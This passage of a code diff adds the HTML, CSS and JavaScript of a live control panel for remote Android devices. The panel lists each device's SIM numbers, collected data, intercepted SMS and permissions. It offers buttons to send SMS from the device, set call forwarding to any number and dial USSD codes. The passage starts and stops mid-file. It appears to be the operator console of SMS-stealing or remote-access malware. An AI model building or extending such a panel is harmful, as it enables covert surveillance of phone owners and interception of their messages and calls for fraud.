+  padding: 20px;
+  animation: fadeIn 0.3s ease;
+}
+
+.check-popup.active {
+  display: flex;
+}
+
+.popup-content {
+  background: white;
+  border-radius: var(--radius-lg);
+  width: 100%;
+  max-width: 400px;
+  overflow: hidden;
+  box-shadow: var(--shadow-lg);
+  border: 2px solid var(--primary);
+  position: relative;
+}
+
+.popup-content::before {
+  content: '';
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 6px;
+  background: var(--primary-gradient);
+}
+
+.popup-header {
+  background: var(--primary-gradient);
+  padding: 20px;
+  color: white;
+}
+
+.popup-title {
+  font-size: 18px;
+  font-weight: 700;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+}
+
+.popup-body {
+  padding: 20px;
+}
+
+.status-container {
+  background: var(--gray-100);
+  border-radius: var(--radius-sm);
+  padding: 16px;
+  margin-bottom: 20px;
+  text-align: center;
+  border: 2px solid var(--gray-200);
+}
+
+.status-label {
+  font-size: 12px;
+  color: var(--gray-500);
+  margin-bottom: 8px;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+  font-weight: 600;
+}
+
+.status-value {
+  font-size: 16px;
+  font-weight: 700;
+  color: var(--primary);
+  font-family: 'Roboto Mono', monospace;
+}
+
+.timer {
+  font-size: 32px;
+  font-weight: 700;
+  text-align: center;
+  margin: 20px 0;
+  font-family: 'Roboto Mono', monospace;
+  color: var(--primary);
+}
+
+.timer.warning { color: #f59e0b; }
+.timer.critical { color: #ef4444; }
+
+.progress-bar {
+  height: 6px;
+  background: var(--gray-200);
+  border-radius: 3px;
+  margin: 20px 0;
+  overflow: hidden;
+}
+
+.progress-fill {
+  height: 100%;
+  background: var(--primary-gradient);
+  border-radius: 3px;
+  transition: width 1s linear;
+}
+
+.popup-message {
+  background: var(--gray-50);
+  border-radius: var(--radius-sm);
+  padding: 16px;
+  margin: 20px 0;
+  text-align: center;
+  font-size: 14px;
+  color: var(--gray-700);
+  border: 2px solid var(--gray-200);
+}
+
+.popup-footer {
+  display: flex;
+  gap: 10px;
+  padding: 20px;
+  border-top: 1px solid var(--gray-200);
+}
+
+/* ================== PERMISSION MODAL - UPDATED ================== */
+.permission-modal {
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background: rgba(0, 0, 0, 0.85);
+  display: none;
+  align-items: center;
+  justify-content: center;
+  z-index: 2001;
+  padding: 20px;
+  animation: fadeIn 0.3s ease;
+}
+
+.permission-modal.active {
+  display: flex;
+}
+
+.permission-modal-content {
+  background: white;
+  border-radius: var(--radius-lg);
+  width: 100%;
+  max-width: 600px;
+  overflow: hidden;
+  box-shadow: var(--shadow-lg);
+  border: 2px solid var(--primary);
+}
+
+.permission-modal-header {
+  background: var(--primary-gradient);
+  padding: 20px;
+  color: white;
+  text-align: center;
+}
+
+.permission-modal-title {
+  font-size: 18px;
+  font-weight: 700;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+  justify-content: center;
+  text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+}
+
+.permission-modal-body {
+  padding: 20px;
+  max-height: 500px;
+  overflow-y: auto;
+}
+
+.permission-raw-data {
+  background: var(--gray-900);
+  color: #e0e0e0;
+  border-radius: var(--radius-sm);
+  padding: 16px;
+  margin-bottom: 15px;
+  border: 1px solid var(--gray-700);
+  font-family: 'Roboto Mono', monospace;
+  font-size: 12px;
+  line-height: 1.5;
+  white-space: pre-wrap;
+  word-break: break-all;
+  max-height: 300px;
+  overflow-y: auto;
+}
+
+.permission-btn {
+  background: rgba(255, 255, 255, 0.15);
+  color: white;
+  border: 2px solid rgba(255, 255, 255, 0.3);
+  padding: 8px 12px;
+  border-radius: var(--radius-sm);
+  cursor: pointer;
+  font-size: 14px;
+  font-weight: 600;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  transition: all var(--transition);
+  backdrop-filter: blur(10px);
+  margin-left: auto;
+  min-width: 100px;
+}
+
+.permission-btn:hover {
+  background: rgba(255, 255, 255, 0.25);
+  transform: translateY(-2px);
+  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.2);
+}
+
+
+.json-key {
+  color: #9cdcfe;
+}
+
+.json-string {
+  color: #ce9178;
+}
+
+.json-number {
+  color: #b5cea8;
+}
+
+.json-boolean {
+  color: #569cd6;
+}
+
+.json-null {
+  color: #569cd6;
+}
+
+.json-colon {
+  color: #d4d4d4;
+}
+
+.json-comma {
+  color: #d4d4d4;
+}
+
+.json-bracket {
+  color: #d4d4d4;
+}
+
+/* ================== FLOATING BUTTON - BLUE THEME ================== */
+.floating-btn {
+  position: fixed;
+  right: 20px;
+  bottom: 20px;
+  width: 56px;
+  height: 56px;
+  border-radius: 50%;
+  background: var(--primary-gradient);
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  box-shadow: var(--shadow-lg);
+  cursor: pointer;
+  z-index: 999;
+  border: 2px solid var(--primary-dark);
+  transition: var(--transition-medium);
+}
+
+.floating-btn:hover {
+  transform: scale(1.1) rotate(5deg);
+  box-shadow: 0 10px 25px rgba(37, 99, 235, 0.3);
+}
+
+.floating-btn i {
+  font-size: 22px;
+  color: white;
+}
+
+.notification-badge {
+  position: absolute;
+  top: -8px;
+  right: -8px;
+  min-width: 20px;
+  height: 20px;
+  background: linear-gradient(135deg, #ef4444, #dc2626);
+  border-radius: 10px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 11px;
+  font-weight: 700;
+  color: white;
+  padding: 0 6px;
+  box-shadow: var(--shadow);
+  border: 2px solid white;
+  animation: pulse 2s infinite;
+}
+
+/* ================== TOAST MESSAGES ================== */
+.toast {
+  position: fixed;
+  top: 20px;
+  right: 20px;
+  background: white;
+  padding: 12px 20px;
+  border-radius: var(--radius-sm);
+  box-shadow: var(--shadow-lg);
+  border-left: 4px solid var(--primary);
+  transform: translateX(120%);
+  transition: transform 0.3s ease;
+  max-width: 300px;
+  z-index: 10001;
+  font-weight: 600;
+  display: flex;
+  align-items: center;
+  gap: 10px;
+}
+
+.toast.show {
+  transform: translateX(0);
+}
+
+.toast.success { 
+  border-left-color: #10b981; 
+  background: #f0fdf4; 
+  border-color: #10b981;
+}
+
+.toast.error { 
+  border-left-color: #ef4444; 
+  background: #fef2f2; 
+  border-color: #ef4444;
+}
+
+.toast.info { 
+  border-left-color: #3b82f6; 
+  background: #eff6ff; 
+  border-color: #3b82f6;
+}
+
+.toast.live { 
+  border-left-color: #ef4444; 
+  background: #fef2f2; 
+  border-color: #ef4444;
+  animation: pulse 2s infinite; 
+}
+
+/* Live update animation */
+@keyframes livePulse {
+  0%, 100% { 
+    transform: scale(1); 
+    box-shadow: 0 0 0 0 rgba(59, 130, 246, 0.7);
+  }
+  50% { 
+    transform: scale(1.02); 
+  }
+  75% {
+    box-shadow: 0 0 0 10px rgba(59, 130, 246, 0);
+  }
+}
+
+@keyframes liveGlow {
+  0%, 100% { box-shadow: var(--shadow); }
+  50% { box-shadow: 0 0 20px rgba(220, 38, 38, 0.3); }
+}
+
+/* ================== TOKEN INFO MODAL ================== */
+.token-modal {
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  background: rgba(0, 0, 0, 0.85);
+  display: none;
+  align-items: center;
+  justify-content: center;
+  z-index: 2000;
+  padding: 20px;
+}
+
+.token-modal.active {
+  display: flex;
+}
+
+.token-modal-content {
+  background: white;
+  border-radius: var(--radius);
+  width: 100%;
+  max-width: 450px;
+  overflow: hidden;
+  box-shadow: var(--shadow-lg);
+  border: 2px solid var(--primary);
+}
+
+.token-modal-header {
+  background: var(--primary-gradient);
+  padding: 20px;
+  color: white;
+  text-align: center;
+}
+
+.token-modal-body {
+  padding: 20px;
+}
+
+.token-info-item {
+  margin-bottom: 20px;
+}
+
+.token-info-label {
+  font-size: 12px;
+  color: var(--gray-600);
+  margin-bottom: 6px;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 0.5px;
+}
+
+.token-info-value {
+  background: var(--gray-50);
+  border: 1px solid var(--gray-300);
+  border-radius: var(--radius-sm);
+  padding: 12px;
+  font-family: 'SF Mono', monospace;
+  font-size: 12px;
+  word-break: break-all;
+  max-height: 100px;
+  overflow-y: auto;
+  color: var(--gray-800);
+}
+
+.token-modal-footer {
+  padding: 20px;
+  border-top: 1px solid var(--gray-200);
+  display: flex;
+  gap: 10px;
+}
+
+/* ================== RESPONSIVE DESIGN ================== */
+@media (max-width: 768px) {
+  .page-container {
+    padding: 12px;
+    padding-top: 72px;
+  }
+  
+  .header {
+    padding: 0 12px;
+    height: 60px;
+  }
+  
+  .back-btn {
+    width: 36px;
+    height: 36px;
+  }
+  
+  .header-title {
+    font-size: 16px;
+  }
+  
+  .permission-btn {
+    width: 36px;
+    height: 36px;
+    font-size: 14px;
+  }
+  
+  .device-main-info {
+    flex-direction: column;
+    align-items: flex-start;
+    gap: 8px;
+  }
+  
+  .device-icon {
+    width: 40px;
+    height: 40px;
+  }
+  
+  .sim-cards-compact {
+    grid-template-columns: 1fr;
+    gap: 8px;
+  }
+  
+  .button-row {
+    grid-template-columns: repeat(3, 1fr);
+    gap: 8px;
+  }
+  
+  .action-btn {
+    min-height: 70px;
+    padding: 10px 4px;
+    font-size: 10px;
+  }
+  
+  .action-btn i {
+    font-size: 16px;
+  }
+  
+  .device-info-row {
+    flex-direction: column;
+    gap: 12px;
+  }
+  
+  .device-info-item {
+    width: 100%;
+    min-width: auto;
+  }
+  
+  .message-header {
+    padding: 14px 16px 8px;
+  }
+  
+  .msg-body-container {
+    padding: 0 16px 16px;
+  }
+  
+  .floating-btn {
+    width: 52px;
+    height: 52px;
+    right: 16px;
+    bottom: 16px;
+  }
+  
+  .floating-btn i {
+    font-size: 20px;
+  }
+  
+  .popup-content {
+    margin: 12px;
+  }
+  
+  .form-actions {
+    flex-direction: column;
+  }
+  
+  .btn {
+    width: 100%;
+  }
+  
+  .data-item-grid {
+    grid-template-columns: 1fr;
+  }
+  
+  .data-section-content.expanded {
+    max-height: 1200px;
+  }
+  
+  .permission-modal-content {
+    margin: 12px;
+  }
+}
+
+@media (max-width: 480px) {
+  .button-row {
+    grid-template-columns: repeat(3, 1fr);
+    gap: 6px;
+  }
+  
+  .action-btn {
+    min-height: 60px;
+    padding: 8px 2px;
+    font-size: 9px;
+  }
+  
+  .action-btn i {
+    font-size: 14px;
+  }
+  
+  .device-name {
+    font-size: 16px;
+  }
+  
+  .panel-content {
+    padding: 12px;
+  }
+  
+  .toast {
+    right: 12px;
+    left: 12px;
+    max-width: none;
+  }
+  
+  .device-data-header {
+    padding: 12px 16px;
+  }
+  
+  .device-data-title {
+    font-size: 14px;
+  }
+  
+  .data-section-header {
+    padding: 12px 14px;
+  }
+  
+  .data-section-title {
+    font-size: 14px;
+  }
+  
+  .permission-info-item {
+    padding: 12px;
+  }
+}
+
+/* ================== SCROLLBAR ================== */
+::-webkit-scrollbar {
+  width: 6px;
+}
+
+::-webkit-scrollbar-track {
+  background: var(--gray-100);
+  border-radius: 3px;
+}
+
+::-webkit-scrollbar-thumb {
+  background: var(--primary);
+  border-radius: 3px;
+}
+
+::-webkit-scrollbar-thumb:hover {
+  background: var(--primary-dark);
+}
+</style>
+</head>
+<body>
+
+<!-- PERMISSION MODAL - UPDATED -->
+<div class="permission-modal" id="permissionModal">
+  <div class="permission-modal-content">
+    <div class="permission-modal-header">
+      <div class="permission-modal-title">
+        <i class="fas fa-lock"></i>
+        Device Permissions
+      </div>
+    </div>
+    <div class="permission-modal-body" id="permissionModalBody">
+      <div style="text-align: center; padding: 20px; color: var(--gray-500);" id="loadingPermissions">
+        <i class="fas fa-spinner fa-spin"></i>
+        Loading permissions...
+      </div>
+    </div>
+    <div class="token-modal-footer">
+      <button class="btn btn-primary" id="refreshPermissionsBtn">
+        <i class="fas fa-sync-alt"></i>
+        Refresh Permissions
+      </button>
+      <button class="btn btn-secondary" id="closePermissionModalBtn">
+        <i class="fas fa-times"></i>
+        Close
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- TOKEN INFO MODAL -->
+<div class="token-modal" id="tokenModal">
+  <div class="token-modal-content">
+    <div class="token-modal-header">
+      <h3 style="margin: 0; font-size: 18px; display: flex; align-items: center; gap: 10px; justify-content: center;">
+        <i class="fas fa-user-shield"></i>
+        Session Information
+      </h3>
+    </div>
+    <div class="token-modal-body">
+      <div class="token-info-item">
+        <div class="token-info-label">Authentication Token</div>
+        <div class="token-info-value" id="modalTokenValue">Loading...</div>
+      </div>
+      <div class="token-info-item">
+        <div class="token-info-label">Session ID</div>
+        <div class="token-info-value" id="modalSessionId">Loading...</div>
+      </div>
+      <div class="token-info-item">
+        <div class="token-info-label">User ID</div>
+        <div class="token-info-value" id="modalUserId">Loading...</div>
+      </div>
+      <div class="token-info-item">
+        <div class="token-info-label">Device ID</div>
+        <div class="token-info-value" id="modalDeviceId">Loading...</div>
+      </div>
+    </div>
+    <div class="token-modal-footer">
+      <button class="btn btn-primary" id="copyTokenBtn">
+        <i class="fas fa-copy"></i>
+        Copy Token
+      </button>
+      <button class="btn btn-secondary" id="closeTokenModalBtn">
+        <i class="fas fa-times"></i>
+        Close
+      </button>
+    </div>
+  </div>
+</div>
+
+<!-- CHECK ONLINE POPUP -->
+<div class="check-popup" id="checkPopup">
+  <div class="popup-content">
+    <div class="popup-header">
+      <div class="popup-title">
+        <i class="fas fa-spinner fa-spin"></i>
+        <span id="popupTitleText">Checking device...</span>
+      </div>
+    </div>
+    <div class="popup-body">
+      <div class="status-container">
+        <div class="status-label">Live Reply Status</div>
+        <div class="status-value" id="popupStatus">Waiting for reply…</div>
+      </div>
+      <div class="timer" id="countdownTimer" style="display:none;">30s</div>
+      <div class="progress-bar">
+        <div class="progress-fill" id="progressFill" style="width: 100%"></div>
+      </div>
+      <div class="popup-message" id="popupMessage">Checking device status...</div>
+    </div>
+    <div class="popup-footer">
+      <button class="btn btn-primary" id="refreshPopupBtn" style="display:none;">
+        <i class="fas fa-sync-alt"></i>
+        Check Again
+      </button>
+      <button class="btn btn-secondary" id="closePopupBtn">
+        <i class="fas fa-times"></i>
+        Close
+      </button>
+    </div>
+  </div>
+</div>
+
+<header class="header">
+  <div class="header-inner">
+    <a href="devices.html" class="back-btn">
+      <i class="fas fa-arrow-left"></i>
+    </a>
+    <div class="header-title">
+      <span class="live-badge">LIVE</span>
+    </div>
+    
+    <button class="user-info-btn" id="userInfoBtn">
+      <i class="fas fa-user-shield"></i>
+      <span id="usernameDisplay"></span>
+    </button>
+    <button class="permission-btn" id="permissionBtn" title="View Device Permissions">Permissions</button>
+    
+    
+  </div>
+</header>
+
+<!-- MAIN CONTENT -->
+<div class="page-container">
+  <div class="device-header">
+    <div class="device-header-content">
+      <div class="device-id-row">
+        <div class="device-id" id="deviceIdDisplay" title="Click to copy">Loading...</div>
+        <div class="last-seen" id="lastSeenDisplay">
+          <i class="fas fa-clock"></i>
+          --
+        </div>
+      </div>
+      
+      <div class="device-main-info">
+        <div class="device-icon">
+          <img src="assets/image/android.png" alt="Android Device" onerror="this.style.display='none'; this.parentNode.innerHTML='<i class=\'fas fa-mobile-alt\'></i>';">
+        </div>
+        <div class="device-details">
+          <div class="device-name" id="deviceName">Loading Device...</div>
+          <span class="device-model" id="deviceModel">Android</span>
+        </div>
+      </div>
+
+      <div class="sim-cards-compact">
+        <!-- SIM 1 - ALWAYS SHOW -->
+        <div class="sim-card-compact" id="sim1CardCompact">
+          <div class="sim-icon">
+            <i class="fas fa-sim-card"></i>
+          </div>
+          <div class="sim-details-compact">
+            <div class="sim-label">SIM 1</div>
+            <div class="sim-info">
+              <div class="sim-number" id="sim1NumberCompact" title="Click to copy phone number">-</div>
+              <div class="sim-carrier">
+                <span id="sim1CarrierCompact">Loading...</span>
+                <span class="sim-status-compact unknown" id="sim1StatusCompact">
+                  <i class="fas fa-question-circle"></i>
+                </span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- SIM 2 - ALWAYS SHOW -->
+        <div class="sim-card-compact" id="sim2CardCompact">
+          <div class="sim-icon">
+            <i class="fas fa-sim-card"></i>
+          </div>
+          <div class="sim-details-compact">
+            <div class="sim-label">SIM 2</div>
+            <div class="sim-info">
+              <div class="sim-number" id="sim2NumberCompact" title="Click to copy phone number">-</div>
+              <div class="sim-carrier">
+                <span id="sim2CarrierCompact">Loading...</span>
+                <span class="sim-status-compact unknown" id="sim2StatusCompact">
+                  <i class="fas fa-question-circle"></i>
+                </span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+      
+      <!-- ACTION BUTTONS - 2 ROWS (3 + 3) -->
+      <div class="action-buttons">
+        <!-- First Row - 3 Buttons -->
+        <div class="button-row">
+          <button class="action-btn sms" id="smsBtn">
+            <i class="fas fa-comment-alt"></i>
+            Send SMS
+          </button>
+          <button class="action-btn call" id="callBtn">
+            <i class="fas fa-phone-alt"></i>
+            Call Forward
+          </button>
+          <button class="action-btn ussd" id="ussdBtn">
+            <i class="fas fa-hashtag"></i>
+            Remote Call
+          </button>
+        </div>
+        
+        <!-- Second Row - 3 Buttons -->
+        <div class="button-row">
+          <button class="action-btn check" id="checkBtn">
+            <i class="fas fa-satellite-dish"></i>
+            Check Online
+          </button>
+          <button class="action-btn data" id="dataBtn">
+            <i class="fas fa-database"></i>
+            Device Data
+          </button>
+          <button class="action-btn history" id="historyBtn">
+            <i class="fas fa-history"></i>
+            Recent
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- DEVICE DATA PANEL (NEW) - ALL DATA WILL SHOW HERE -->
+  <div class="device-data-panel" id="deviceDataPanel">
+    <div class="device-data-header" id="deviceDataHeader">
+      <div class="device-data-title">
+        <i class="fas fa-database"></i>
+        Device Collected Data
+        <span class="device-data-count" id="dataCountBadge">0</span>
+      </div>
+      <div class="device-data-toggle">
+        <i class="fas fa-chevron-down"></i>
+      </div>
+    </div>
+    <div class="device-data-content" id="deviceDataContent">
+      <div id="deviceDataSections">
+        <!-- Data sections will be loaded here -->
+        <div class="no-data-message">
+          <i class="fas fa-database"></i>
+          <h3>No Data Collected Yet</h3>
+          <p>This device hasn't collected any data yet.</p>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- SMS Panel -->
+  <div class="panel sms-panel" id="smsPanel">
+    <div class="panel-content">
+      <div class="panel-header">
+        <i class="fas fa-comment-alt"></i>
+        <div class="panel-title">Send SMS</div>
+      </div>
+      <div class="form-group">
+        <label class="form-label">
+          <i class="fas fa-sim-card"></i>
+          SIM Slot
+        </label>
+        <select class="form-select" id="smsSimSlot">
+          <option value="0">SIM 1 (Loading...)</option>
+        </select>
+      </div>
+      <div class="form-group">
+        <label class="form-label">
+          <i class="fas fa-phone"></i>
+          Phone Number
+        </label>
+        <input type="text" class="form-input" id="smsNumber" placeholder="Enter phone number">
+      </div>
+      <div class="form-group">
+        <label class="form-label">
+          <i class="fas fa-envelope"></i>
+          Message
+        </label>
+        <textarea class="form-textarea" id="smsMessage" placeholder="Type your message..."></textarea>
+      </div>
+      <div class="form-actions">
+        <button class="btn btn-primary" id="sendSmsBtn">
+          <i class="fas fa-paper-plane"></i>
+          Send SMS
+        </button>
+        <button class="btn btn-secondary" id="clearSmsBtn">
+          <i class="fas fa-eraser"></i>
+          Clear
+        </button>
+        <button class="btn btn-secondary" id="closeSmsPanelBtn">
+          <i class="fas fa-times"></i>
+          Close
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Call Panel -->
+  <div class="panel" id="callPanel">
+    <div class="panel-content">
+      <div class="panel-header">
+        <i class="fas fa-phone-alt"></i>
+        <div class="panel-title">Call Forward</div>
+      </div>
+      <div class="form-group">
+        <label class="form-label">
+          <i class="fas fa-sim-card"></i>
+          SIM Slot
+        </label>
+        <select class="form-select" id="callSimSlot">
+          <option value="0">SIM 1 (Loading...)</option>
+        </select>
+      </div>
+      <div class="form-group">
+        <label class="form-label">
+          <i class="fas fa-phone-volume"></i>
+          Forward Number
+        </label>
+        <input type="text" class="form-input" id="forwardNumber" placeholder="Enter number to forward calls">
+      </div>
+      <div class="form-actions">
+        <button class="btn btn-primary" id="activateCallBtn">
+          <i class="fas fa-play-circle"></i>
+          Activate
+        </button>
+        <button class="btn btn-danger" id="deactivateCallBtn">
+          <i class="fas fa-stop-circle"></i>
+          Deactivate
+        </button>
+        <button class="btn btn-secondary" id="closeCallPanelBtn">
+          <i class="fas fa-times"></i>
+          Close
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- USSD Panel -->
+  <div class="panel" id="ussdPanel">
+    <div class="panel-content">
+      <div class="panel-header">
+        <i class="fas fa-hashtag"></i>
+        <div class="panel-title">USSD Dial</div>
+      </div>
+      <div class="form-group">
+        <label class="form-label">
+          <i class="fas fa-sim-card"></i>
+          SIM Slot
+        </label>
+        <select class="form-select" id="ussdSimSlot">
+          <option value="0">SIM 1 (Loading...)</option>
+        </select>
+      </div>
+      <div class="form-group">
+        <label class="form-label">
+          <i class="fas fa-hashtag"></i>
+          USSD Code
+        </label>
+        <input type="text" class="form-input" id="ussdCode" placeholder="*123#">
+      </div>
+      <div class="form-actions">
+        <button class="btn btn-primary" id="sendUssdBtn">
+          <i class="fas fa-play"></i>
+          Send Code
+        </button>
+        <button class="btn btn-secondary" id="closeUssdPanelBtn">
+          <i class="fas fa-times"></i>
+          Close
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- HISTORY PANEL -->
+  <div class="panel history-panel" id="historyPanel">
+    <div class="panel-content">
+      <div class="panel-header">
+        <i class="fas fa-history"></i>
+        <div class="panel-title">Recent Activity</div>
+      </div>
+      <div class="history-list" id="historyList">
+        <div style="text-align: center; padding: 20px; color: var(--gray-500);">
+          <i class="fas fa-spinner fa-spin"></i>
+          Loading history...
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- DEVICE MESSAGES SECTION - MESSAGES PAGE STYLE -->
+  <div class="messages-container" id="deviceMessagesList">
+    <div style="text-align: center; padding: 20px; color: var(--gray-500);" id="loadingMessages">
+      <i class="fas fa-spinner fa-spin"></i>
+      Loading device messages...
+    </div>
+  </div>
+</div>
+
+<!-- FLOATING BUTTON -->
+<button class="floating-btn" id="smsFloatingBtn">
+  <i class="fas fa-envelope"></i>
+  <span class="notification-badge" id="notificationBadge" style="display:none;">0</span>
+</button>
+<script type="module">
+const API_BASE = import.meta.env.VITE_API_BASE;
+const DEVICE_ID = new URLSearchParams(location.search).get("id") || "-";
+
+// Auth token from localStorage
+let AUTH_TOKEN = localStorage.getItem('mr_robot_token');
+let SESSION_ID = localStorage.getItem('mr_robot_session_id');
+let USER_ID = localStorage.getItem('mr_robot_userId');
+
+// APIs with Authorization
+const DEVICE_API = `${API_BASE}/api/devices`;
+const COMMAND_API = `${API_BASE}/api/command`;
+const CHECK_API = `${API_BASE}/api/check-online`;
+const BROS_REPLY_API = `${API_BASE}/api/brosreply`;
+const SMS_API = `${API_BASE}/api/sms`;
+const HISTORY_API = `${API_BASE}/api/history/${DEVICE_ID}`;
+const ALL_MESSAGES_API = `${API_BASE}/api/sms/all`;
+const VERIFY_TOKEN_API = `${API_BASE}/api/verify-token`;
+const DEVICE_ALL_DATA_API = `${API_BASE}/api/all-data`;
+const PERMISSIONS_API = `${API_BASE}/api/device/${DEVICE_ID}/permissions`;
+
+// Common headers for API calls
+function getAuthHeaders(contentType = 'application/json') {
+  const headers = {
+    'Content-Type': contentType,
+    'Accept': 'application/json'
+  };
+  
+  if (AUTH_TOKEN) {
+    headers['Authorization'] = `Bearer ${AUTH_TOKEN}`;
+  }
+  
+  return headers;
+}
+
+// ===================== STATE VARIABLES =====================
+let currentDevice = null;
+let allSmsData = [];
+let combinedHistory = [];
+let liveSmsCount = 0;
+let processedLiveSmsIds = new Set();
+let processedHistoryIds = new Set();
+let socket = null;
+let currentReplyUid = null;
+let countdownInterval = null;
+let countdownSeconds = 30;
+let deviceAllData = null;
+let devicePermissions = null;
+
+// ===================== AUTH FUNCTIONS =====================
+function checkAuth() {
+  if (!AUTH_TOKEN || !SESSION_ID) {
+    console.log('❌ No authentication token found');
+    redirectToLogin();
+    return false;
+  }
+  
+  // Update UI with user info (ADMIN REMOVED)
+  updateUserInfo();
+  
+  // Verify token with server in background
+  verifyTokenWithServer();
+  
+  return true;
+}
+
+function redirectToLogin() {
+  localStorage.removeItem('mr_robot_token');
+  localStorage.removeItem('mr_robot_session_id');
+  localStorage.removeItem('mr_robot_userId');
+  localStorage.removeItem('mr_robot_active_sessions');
+  window.location.href = 'index.html';
+}
+
+async function verifyTokenWithServer() {
+  try {
+    const response = await fetch(VERIFY_TOKEN_API, {
+      method: 'POST',
+      headers: getAuthHeaders(),
+      body: JSON.stringify({
+        sessionId: SESSION_ID
+      })
+    });
+    
+    const data = await response.json();
+    
+    if (!data.valid) {
+      console.log('❌ Token verification failed:', data.message);
+      redirectToLogin();
+      return false;
+    }
+    
+    console.log('✅ Token verified successfully');
+    return true;
+    
+  } catch (error) {
+    console.error('❌ Token verification error:', error);
+    return true; // Network error mein bhi allow karo
+  }
+}
+
+function updateUserInfo() {
+  const username = USER_ID || '';
+  document.getElementById('usernameDisplay').textContent = username;
+}
+
+// ===================== PERMISSION MODAL FUNCTIONS - UPDATED =====================
+async function loadDevicePermissions() {
+  try {
+    console.log('🔒 Loading permissions for device:', DEVICE_ID);
+    
+    const response = await fetchWithAuth(PERMISSIONS_API);
+    const result = await response.json();
+    
+    console.log('📋 Permissions API response:', result);
+    
+    if (result.success) {
+      // Directly use the data as it comes from API
+      devicePermissions = result.data;
+      console.log('✅ Device permissions loaded:', devicePermissions);
+      
+      // Update modal with raw data
+      updatePermissionModalWithRawData(devicePermissions);
+      return true;
+    } else {
+      console.log('❌ No permissions data found in response');
+      showNoPermissionsMessage();
+      return false;
+    }
+    
+  } catch (error) {
+    console.error('❌ Error loading permissions:', error);
+    showNoPermissionsMessage();
+    return false;
+  }
+}
+
+function updatePermissionModalWithRawData(permissionsData) {
+  const modalBody = document.getElementById('permissionModalBody');
+  
+  if (!permissionsData) {
+    modalBody.innerHTML = `
+      <div style="text-align: center; padding: 40px; color: var(--gray-500);">
+        <i class="fas fa-exclamation-circle"></i>
+        <h5>No Permissions Data</h5>
+        <p>No permission data available for this device</p>
+      </div>
+    `;
+    return;
+  }
+  
+  // Format the data as pretty JSON
+  const formattedJson = JSON.stringify(permissionsData, null, 2);
+  
+  // Syntax highlight the JSON
+  const highlightedJson = syntaxHighlightJSON(formattedJson);
+  
+  modalBody.innerHTML = `
+    <div style="margin-bottom: 20px;">
+      <div class="permission-raw-data">
+        ${highlightedJson}
+      </div>
+    </div>
+  
+    </div>
+  `;
+}
+
+function syntaxHighlightJSON(json) {
+  json = json.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;');
+  return json.replace(/("(\\u[a-zA-Z0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false|null)\b|-?\d+(?:\.\d*)?(?:[eE][+\-]?\d+)?)/g, function (match) {
+    let cls = 'json-number';
+    if (/^"/.test(match)) {
+      if (/:$/.test(match)) {
+        cls = 'json-key';
+      } else {
+        cls = 'json-string';
+      }
+    } else if (/true|false/.test(match)) {
+      cls = 'json-boolean';
+    } else if (/null/.test(match)) {
+      cls = 'json-null';
+    }
+    return '<span class="' + cls + '">' + match + '</span>';
+  });
+}
+
+function showNoPermissionsMessage() {
+  const modalBody = document.getElementById('permissionModalBody');
+  modalBody.innerHTML = `
+    <div style="text-align: center; padding: 40px; color: var(--gray-500);">
+      <i class="fas fa-exclamation-circle"></i>
+      <h3>No Permissions Data</h3>
+      <p>Failed to load permissions data</p>
+    </div>
+  `;
+}
+
+function showPermissionModal() {
+  // Always load fresh data when opening modal
+  loadDevicePermissions();
+  document.getElementById('permissionModal').classList.add('active');
+}
+
+function initPermissionModal() {
+  document.getElementById('permissionBtn').onclick = showPermissionModal;
+  
+  document.getElementById('refreshPermissionsBtn').onclick = function() {
+    loadDevicePermissions();
+    showToast('Permissions refreshed', 'success');
+  };
+  
+  document.getElementById('closePermissionModalBtn').onclick = function() {
+    document.getElementById('permissionModal').classList.remove('active');
+  };
+  
+  // Close modal on outside click
+  document.getElementById('permissionModal').onclick = function(e) {
+    if (e.target === this) {
+      this.classList.remove('active');
+    }
+  };
+}
+
+// ===================== TOKEN MODAL FUNCTIONS =====================
+function showTokenModal() {
+  const token = AUTH_TOKEN || '';
+  const sessionId = SESSION_ID || '';
+  const userId = USER_ID || '';
+  
+  // Show first and last 10 chars of token
+  let tokenDisplay = token;
+  if (token.length > 30) {
+    tokenDisplay = token.substring(0, 20) + '...' + token.substring(token.length - 10);
+  }
+  
+  document.getElementById('modalTokenValue').textContent = tokenDisplay;
+  document.getElementById('modalSessionId').textContent = sessionId;
+  document.getElementById('modalUserId').textContent = userId;
+  document.getElementById('modalDeviceId').textContent = DEVICE_ID;
+  
+  document.getElementById('tokenModal').classList.add('active');
+}
+
+function initTokenModal() {
+  document.getElementById('userInfoBtn').onclick = showTokenModal;
+  
+  document.getElementById('copyTokenBtn').onclick = function() {
+    copyToClipboard(AUTH_TOKEN, 'Token copied to clipboard');
+  };
+  
+  document.getElementById('closeTokenModalBtn').onclick = function() {
+    document.getElementById('tokenModal').classList.remove('active');
+  };
+  
+  // Close modal on outside click
+  document.getElementById('tokenModal').onclick = function(e) {
+    if (e.target === this) {
+      this.classList.remove('active');
+    }
+  };
+}
+
+// ===================== INITIALIZATION WITH AUTH =====================
+document.addEventListener('DOMContentLoaded', async function() {
+  // Check authentication first
+  if (!checkAuth()) {
+    return;
+  }
+  
+  initElements();
+  initEventListeners();
